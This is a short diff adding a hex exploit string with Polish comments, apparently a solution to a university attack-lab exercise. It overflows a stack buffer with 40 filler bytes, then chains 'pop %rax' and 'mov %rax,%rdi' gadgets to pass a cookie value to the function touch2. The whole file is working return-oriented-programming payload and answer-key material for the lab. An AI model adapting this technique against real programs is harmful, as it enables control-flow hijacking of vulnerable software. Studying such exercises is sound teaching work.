@@ -1,0 +1,10 @@
+/* nastepna linie nie koduje niczego, sluzy jedynie do zapelnienia stosu, aby moc zmienic adres powrotu */
+ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
+/* zmiana adresu powrotu na gadzet pop %rax z ret */
+b7 19 40 00 00 00 00 00
+/* bajtowo zapisane ciasteczko */
+88 8e 05 27 00 00 00 00
+/* kolejna zmiana adresu powrotu na gadzet mov %rax %rdi z nop i ret */
+d5 19 40 00 00 00 00 00
+/* zmiana na adres powrotu do touch2 */ 
+36 18 40 00 00 00 00 00
